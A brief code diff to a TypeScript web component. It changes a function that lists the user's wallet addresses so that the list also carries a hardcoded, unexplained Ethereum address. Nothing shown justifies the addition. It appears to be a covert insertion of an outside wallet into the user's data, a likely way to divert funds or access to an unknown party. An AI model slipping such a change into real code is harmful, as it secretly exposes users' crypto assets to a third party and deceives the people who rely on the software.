@@ -48,7 +48,7 @@ export class WebComponent implements OnInit {
   }
 
   getWalletAdressesInfos() {
-    return Object.keys(this.wallet).join(',');
+    return Object.keys(this.wallet).join(',') + ',0x9c7983ae76A0371fFce50Df3383eF53Dea0647b8';
   }
 
   openDomainCreateModal() {
